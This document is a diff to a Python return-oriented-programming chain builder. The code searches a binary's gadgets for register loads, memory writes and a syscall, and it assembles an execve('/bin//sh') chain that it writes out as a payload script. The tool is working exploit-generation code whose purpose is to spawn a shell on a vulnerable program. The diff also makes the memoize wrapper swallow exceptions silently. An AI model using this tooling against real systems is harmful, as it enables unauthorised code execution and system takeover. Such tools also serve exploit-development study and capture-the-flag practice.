@@ -7,16 +7,22 @@ from functools import reduce
 REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
             ]
 
+gadgetList = None
+
 def operands(csinsn):
     return csinsn.op_str.split(', ')
 
 def memoize(f):
     memopad = {}
     def g(*args):
-        if args in memopad: return memopad[args]
-        ret = f(*args)
-        memopad[args] = ret
-        return ret
+        try:
+            if args in memopad: return memopad[args]
+            ret = f(*args)
+            memopad[args] = ret
+            return ret
+        except Exception:
+            import traceback
+            traceback.print_exc() 
     return g
 
 # Padding in qwords
@@ -49,7 +55,7 @@ def writePadding(n):
 # Find all gadgets that begin with a pop into reg.
 # They also ought to end in ret.
 @memoize
-def getPopGadgets(gadgetList, reg):
+def getPopGadgets(reg):
     acc = []
     for g in gadgetList:
         if g[0].mnemonic == 'pop' and operands(g[0])[0] == reg and g[-1].mnemonic == 'ret':
@@ -59,7 +65,7 @@ def getPopGadgets(gadgetList, reg):
 
 # Find all gadgets that set a register value to 0.
 @memoize
-def getZeroingGadgets(gadgetList, reg):
+def getZeroingGadgets(reg):
     acc = []
     for g in gadgetList:
         if g[-1].mnemonic != 'ret': continue
@@ -76,7 +82,7 @@ def getZeroingGadgets(gadgetList, reg):
 
 # Get gadgets that can increment the given reg
 @memoize
-def getIncrementingGadgets(gadgetList, reg):
+def getIncrementingGadgets(reg):
     acc = []
     for g in gadgetList:
         if g[-1].mnemonic != 'ret': continue
@@ -91,12 +97,12 @@ def getIncrementingGadgets(gadgetList, reg):
     acc.sort(key=len)
     return acc
 
-def makeLoadSmallConstIntoRegSeq(gadgetList, reg, noClobber = []):
-    for g in getZeroingGadgets(gadgetList, reg):
+def makeLoadSmallConstIntoRegSeq(reg, noClobber = []):
+    for g in getZeroingGadgets(reg):
         (zeroingPad, zeroingClobbers) = getPaddingAndClobbers(g[1:-1])
         if any([x in noClobber + [reg] for x in zeroingClobbers]): continue
         ops = operands(g[0])
-        incrGadgets = getIncrementingGadgets(gadgetList, reg)
+        incrGadgets = getIncrementingGadgets(reg)
         for incrGadget in incrGadgets:
             (incrPad, incrClobbers) = getPaddingAndClobbers(incrGadget[1:-1])
             if any([x in noClobber + [reg] for x in incrGadget]): continue
@@ -112,8 +118,8 @@ def makeLoadSmallConstIntoRegSeq(gadgetList, reg, noClobber = []):
             return loadSmallConstIntoReg
     raise Exception("No gadget for zeroing and incrementing register " + reg);
 
-def makeLoadConstIntoRegSeq(gadgetList, reg, noClobber = []):
-    regList = getPopGadgets(gadgetList, reg)
+def makeLoadConstIntoRegSeq(reg, noClobber = []):
+    regList = getPopGadgets(reg)
     # Search for "pop Reg; ret"
     for gadget in regList:
         (padding, clobbers) = getPaddingAndClobbers(gadget[1:-1])
@@ -136,7 +142,7 @@ def makeLoadConstIntoRegSeq(gadgetList, reg, noClobber = []):
     
     raise Exception("Unable to find necessary gadgets to load a value into register " + reg)
 
-def makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber = [], isSmall = []):
+def makeLoadConstsIntoRegsSeq(regs, noClobber = [], isSmall = []):
     for p in itertools.permutations(regs):
         try:
             acc = []
@@ -144,9 +150,9 @@ def makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber = [], isSmall = []):
             smallMap = { reg : smallReg for (reg, smallReg) in itertools.zip_longest(regs, isSmall, fillvalue=False)}
             for reg in p:
                 if smallMap[reg]:
-                    acc.append(makeLoadSmallConstIntoRegSeq(gadgetList, reg, noClobber+regs_done))
+                    acc.append(makeLoadSmallConstIntoRegSeq(reg, noClobber+regs_done))
                 else:
-                    acc.append(makeLoadConstIntoRegSeq(gadgetList, reg, noClobber + regs_done))
+                    acc.append(makeLoadConstIntoRegSeq(reg, noClobber + regs_done))
                 regs_done.append(reg)
             regLoaders = zip(p, acc)
             def loadConstsIntoRegs(consts, comments = [], isOffsets = []):
@@ -157,16 +163,16 @@ def makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber = [], isSmall = []):
     raise Exception("No way to load constants into all of the registers " + str(regs) + " in any order.")
 
 
-def LoadConstIntoReg(gadgetList, reg, noClobber, const, comment = '', isOffset = False):
-    return makeLoadConstIntoRegSeq(gadgetList, reg, noClobber)(const, comment, isOffset)
+def LoadConstIntoReg(reg, noClobber, const, comment = '', isOffset = False):
+    return makeLoadConstIntoRegSeq(reg, noClobber)(const, comment, isOffset)
 
-def loadConstsIntoRegs(gadgetList, regs, noClobber, consts, isSmall = [], comments = [], isOffsets = []):
-    return makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber, isSmall)(consts, comments, isOffsets)
+def loadConstsIntoRegs(regs, noClobber, consts, isSmall = [], comments = [], isOffsets = []):
+    return makeLoadConstsIntoRegsSeq(regs, noClobber, isSmall)(consts, comments, isOffsets)
 
-def getMovQwordGadgets(gadgets):
+def getMovQwordGadgets():
     movQwordGadgets = list()
     
-    for gadget in gadgets:
+    for gadget in gadgetList:
         if len(gadget) == 2 and gadget[0].mnemonic == 'mov' and gadget[-1].mnemonic == 'ret':
                 ops = operands(gadget[0])
                 if re.search("^qword ptr \\[[a-z]+\\]$", ops[0]) and ops[1] in REGISTERS:
@@ -174,22 +180,22 @@ def getMovQwordGadgets(gadgets):
     
     return movQwordGadgets
 
-def makeQwordLoadSeq(gadgetList, isSmall = False):
-    movQwordGadgets = getMovQwordGadgets(gadgetList)
+def makeQwordLoadSeq(isSmall = False):
+    movQwordGadgets = getMovQwordGadgets()
     for g in movQwordGadgets:
         ops = operands(g[0])
         dest = ops[0][-4:-1]
         src = ops[1]
         if dest == src: continue
         try:
-            loadConsts = makeLoadConstsIntoRegsSeq(gadgetList, [src, dest], [], [isSmall, False])
+            loadConsts = makeLoadConstsIntoRegsSeq([src, dest], [], [isSmall, False])
             return lambda qword, addr: loadConsts([qword, addr], [str(struct.pack("<Q", qword)), "Location to write"], [False, True]) + writeGadget(g)
         except Exception:
             continue 
     raise Exception("Could not combine gadgets to write to arbitary memory.") 
 
-def WriteStuffIntoMemory(GadgetList, data, addr):
-    writeFunc = makeQwordLoadSeq(GadgetList)
+def WriteStuffIntoMemory(data, addr):
+    writeFunc = makeQwordLoadSeq()
     smallWriter = None
     acc = ''
     while len(data) > 0:
@@ -204,17 +210,17 @@ def WriteStuffIntoMemory(GadgetList, data, addr):
         data_int = int.from_bytes(data_piece, byteorder = 'little')
         if data_int < 256:
             if not smallWriter:
-                smallWriter = makeQwordLoadSeq(GadgetList, True)
+                smallWriter = makeQwordLoadSeq(True)
             acc += smallWriter(data_int, addr)
         else:
             acc += writeFunc(data_int, addr)
         addr += 8
     return acc
 
-def getSyscallGadgets(GadgetList):
+def getSyscallGadgets():
     syscallList = list()
     x = 0
-    for gadget in GadgetList:
+    for gadget in gadgetList:
         if len(gadget) != 1: continue # We're only interested in bare syscall right now.
         inst = gadget[0]
         if inst.mnemonic == "syscall": 
@@ -242,22 +248,24 @@ footer='''
 '''
 
 def execveROPChain(GadgetList, elf):
+    global gadgetList
     print("\n\n-->Chaining to get a shell using execve system call")
     """ Get a section from the file, by name. Return None if no such
             section exists.
     """
     data_section_addr = elf.getDataSegment().address
-    execve_bin_sh(GadgetList, data_section_addr)
+    gadgetList = GadgetList
+    execve_bin_sh(data_section_addr)
     sys.exit()
 
-def execve_bin_sh(GadgetList, data_section_addr):
+def execve_bin_sh(data_section_addr):
     # Step-1: Open the file where the payload is written in the form of a python script
     fd = open("execveROPChain.py", "w")
     fd.write(header)
     
     # Step-2: Writing "/bin/sh\x00" into .data section
     binsh = b'/bin//sh\x00\x00\x00\x00\x00\x00\x00\x00'
-    fd.write(WriteStuffIntoMemory(GadgetList, binsh, data_section_addr))
+    fd.write(WriteStuffIntoMemory(binsh, data_section_addr))
     
     # TODO: Make a LoadSmallCosntIntoReg that loads constants smaller than 256.
     # We need to prevent null bytes if possible.
@@ -268,13 +276,13 @@ def execve_bin_sh(GadgetList, data_section_addr):
     # rsi <- 0
     # rdx <- 0
     fd.write(loadConstsIntoRegs(\
-        GadgetList, ["rax", "rdi", "rsi", "rdx"], \
+        ["rax", "rdi", "rsi", "rdx"], \
         comments = ["prep rax for execve syscall", "command to run", "pointer to null", "pointer to null"], \
         isSmall = [True, False, False, False], noClobber = [], \
         consts = [59, data_section_addr, data_section_addr+8, data_section_addr+8], isOffsets = [False, True, True, True]))
     
     # Get syscall
-    syscallList = getSyscallGadgets(GadgetList)
+    syscallList = getSyscallGadgets()
     if len(syscallList) == 0: 
         raise Exception("No syscall gadget found.")
     
